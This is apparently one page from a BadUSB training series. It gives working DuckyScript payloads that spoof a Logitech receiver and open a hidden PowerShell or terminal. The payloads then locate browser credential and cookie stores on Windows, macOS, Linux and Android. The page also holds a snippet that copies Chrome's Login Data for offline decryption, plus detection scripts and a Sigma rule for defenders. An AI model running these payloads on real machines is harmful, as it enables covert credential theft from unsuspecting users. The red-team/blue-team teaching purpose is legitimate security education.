# FZ-I03: Browser Data Locator

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I03 |
| **Name** | Browser Data Locator |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~6 seconds |
| **Output** | %TEMP%\browsers.txt |
| **MITRE ATT&CK** | T1217 (Browser Bookmark Discovery) |

## What This Payload Does

Locates browser data directories for Chrome, Firefox, Edge, and other browsers. Identifies paths to credential stores, cookies, history, and bookmarks without actually extracting encrypted data.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Browser Data Locator
REM Target: Windows 10/11
REM Action: Finds browser profile paths
REM Output: %TEMP%\browsers.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Locate browser data directories
STRINGLN $out = @()
STRINGLN $out += "=== BROWSER DATA LOCATIONS ==="
STRINGLN $out += "Generated: $(Get-Date)"
STRINGLN $out += ""

REM Chrome
STRINGLN $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
STRINGLN if (Test-Path $chrome) { $out += "CHROME: $chrome"; $out += "  - Login Data: $(Test-Path "$chrome\Login Data")"; $out += "  - Cookies: $(Test-Path "$chrome\Cookies")"; $out += "  - History: $(Test-Path "$chrome\History")" }

REM Firefox
STRINGLN $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
STRINGLN if (Test-Path $ffPath) { Get-ChildItem $ffPath -Directory | ForEach-Object { $out += "FIREFOX: $($_.FullName)"; $out += "  - logins.json: $(Test-Path "$($_.FullName)\logins.json")"; $out += "  - key4.db: $(Test-Path "$($_.FullName)\key4.db")" }}

REM Edge
STRINGLN $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
STRINGLN if (Test-Path $edge) { $out += "EDGE: $edge"; $out += "  - Login Data: $(Test-Path "$edge\Login Data")" }

STRINGLN $out | Out-File "$env:TEMP\browsers.txt"
STRINGLN exit
```

---

## Browser Data Locations Reference

### Windows

| Browser | Profile Location |
|---------|-----------------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data\Default` |
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles\*.default*` |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` |
| Brave | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default` |
| Opera | `%APPDATA%\Opera Software\Opera Stable` |
| Vivaldi | `%LOCALAPPDATA%\Vivaldi\User Data\Default` |

### Important Files

| File | Contents |
|------|----------|
| `Login Data` | Encrypted credentials (Chromium) |
| `Cookies` | Session cookies |
| `History` | Browsing history |
| `Bookmarks` | Saved bookmarks |
| `logins.json` | Firefox credentials (encrypted) |
| `key4.db` | Firefox master key database |
| `cookies.sqlite` | Firefox cookies |

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN {
STRINGLN echo "=== BROWSER DATA ===" > /tmp/browsers.txt
STRINGLN echo "Chrome: ~/Library/Application Support/Google/Chrome/Default" >> /tmp/browsers.txt
STRINGLN ls -la ~/Library/Application\ Support/Google/Chrome/Default/ 2>/dev/null | head -20 >> /tmp/browsers.txt
STRINGLN echo "Safari: ~/Library/Safari" >> /tmp/browsers.txt
STRINGLN ls -la ~/Library/Safari/ 2>/dev/null >> /tmp/browsers.txt
STRINGLN echo "Firefox:" >> /tmp/browsers.txt
STRINGLN ls -la ~/Library/Application\ Support/Firefox/Profiles/ 2>/dev/null >> /tmp/browsers.txt
STRINGLN } 2>/dev/null
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN {
STRINGLN echo "=== BROWSER DATA ===" > /tmp/browsers.txt
STRINGLN echo "Chrome: ~/.config/google-chrome/Default" >> /tmp/browsers.txt
STRINGLN ls -la ~/.config/google-chrome/Default/ 2>/dev/null | head -20 >> /tmp/browsers.txt
STRINGLN echo "Firefox:" >> /tmp/browsers.txt
STRINGLN ls -la ~/.mozilla/firefox/*.default*/ 2>/dev/null >> /tmp/browsers.txt
STRINGLN echo "Chromium:" >> /tmp/browsers.txt
STRINGLN ls -la ~/.config/chromium/Default/ 2>/dev/null >> /tmp/browsers.txt
STRINGLN } 2>/dev/null
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
REM Android browser data requires root
STRINGLN echo "Browser data paths (root required):" > /sdcard/browsers.txt
STRINGLN echo "/data/data/com.android.chrome/app_chrome/Default" >> /sdcard/browsers.txt
STRINGLN echo "/data/data/org.mozilla.firefox/files/mozilla/*.default" >> /sdcard/browsers.txt
STRINGLN su -c "ls -la /data/data/com.android.chrome/ 2>/dev/null" >> /sdcard/browsers.txt
```

### iOS Limitations

iOS does not allow access to browser data from external keyboards or USB devices. Safari credentials are stored in the iOS Keychain with hardware-backed encryption.

---

## macOS Browser Locations

| Browser | Location |
|---------|----------|
| Chrome | `~/Library/Application Support/Google/Chrome` |
| Safari | `~/Library/Safari` |
| Firefox | `~/Library/Application Support/Firefox/Profiles` |
| Brave | `~/Library/Application Support/BraveSoftware/Brave-Browser` |

## Linux Browser Locations

| Browser | Location |
|---------|----------|
| Chrome | `~/.config/google-chrome` |
| Firefox | `~/.mozilla/firefox` |
| Chromium | `~/.config/chromium` |
| Brave | `~/.config/BraveSoftware/Brave-Browser` |

---

## Red Team Perspective

### Why Browser Data Matters

| Data Type | Intelligence Value |
|-----------|-------------------|
| Saved Passwords | Direct credential access |
| Cookies | Session hijacking |
| History | Target profiling, frequented sites |
| Bookmarks | Internal URLs, admin panels |
| Autofill | PII, addresses, phone numbers |

### Attack Chain

```
Locate Browser Data → Copy Files → Offline Decryption → Credential Use
         ↑
    You are here
```

### Extracting Actual Data (Advanced)

Chromium browsers encrypt data with DPAPI (Windows) or Keychain (macOS). Full extraction requires:

1. **Login Data**: SQLite database with encrypted passwords
2. **Local State**: Contains encryption key (DPAPI encrypted)
3. **Decryption**: Requires user context or DPAPI blob

```powershell
# Example: View Chrome Login Data structure (not passwords)
$db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
# Copy file (Chrome locks it while running)
Copy-Item $db "$env:TEMP\LoginData.db"
# Requires SQLite and decryption to read passwords
```

---

## Blue Team Perspective

### Detection Opportunities

1. **File Access Patterns**
   - Access to browser profile directories
   - Reading Login Data, Cookies files

2. **Process Behavior**
   - PowerShell enumerating AppData directories
   - Non-browser processes reading browser files

3. **Suspicious Activity**
   - Copying browser databases
   - SQLite operations on browser files

### Detection Script

```powershell
# Monitor browser data access
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
)

# Check recent file access (requires auditing enabled)
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4663
} -MaxEvents 500 | Where-Object {
    $paths | Where-Object { $_.Message -match $_ }
}
```

### Sigma Rule

```yaml
title: Browser Data Reconnaissance
status: experimental
description: Detects enumeration of browser credential storage locations
logsource:
    product: windows
    category: process_creation
detection:
    selection_ps:
        CommandLine|contains:
            - 'Chrome\User Data'
            - 'Mozilla\Firefox\Profiles'
            - 'Edge\User Data'
            - 'Login Data'
            - 'logins.json'
    selection_proc:
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
    condition: selection_ps and selection_proc
level: medium
tags:
    - attack.credential_access
    - attack.t1217
```

### Prevention

1. **Browser Security**
   - Use browser master passwords (Firefox)
   - Enable Windows Defender Credential Guard

2. **File System**
   - Monitor access to browser profile directories
   - Restrict access to credential files

3. **Endpoint Protection**
   - EDR rules for browser data access
   - Block unauthorized SQLite operations on browser files

---

## Practice Exercises

### Exercise 1: Check Browser Installation
List which browsers are installed:
```ducky
STRINGLN $browsers = @{Chrome="$env:ProgramFiles\Google\Chrome";Firefox="$env:ProgramFiles\Mozilla Firefox";Edge="$env:ProgramFiles (x86)\Microsoft\Edge"}; $browsers.GetEnumerator() | ForEach-Object { "$($_.Key): $(Test-Path $_.Value)" }
```

### Exercise 2: Browser History Size
Check size of browser history files:
```ducky
STRINGLN Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -ErrorAction SilentlyContinue | Select Name, Length
```

### Exercise 3: Multiple Profiles
Find all Chrome profiles (not just Default):
```ducky
STRINGLN Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { Test-Path "$($_.FullName)\Login Data" }
```

---

## Payload File

Save as `FZ-I03_Browser_Data_Locator.txt`:

```ducky
REM FZ-I03: Browser Data Locator
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN $o=@("=== BROWSERS ===");@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";Firefox="$env:APPDATA\Mozilla\Firefox\Profiles";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"}.GetEnumerator()|%{if(Test-Path $_.Value){$o+="$($_.Key): $($_.Value)"}};$o|Out-File "$env:TEMP\browsers.txt";exit
```

---

[← FZ-I02 WiFi Password Extractor](FZ-I02_WiFi_Password_Extractor.md) | [Back to Intermediate](README.md) | [Next: FZ-I04 Network Reconnaissance →](FZ-I04_Network_Reconnaissance.md)
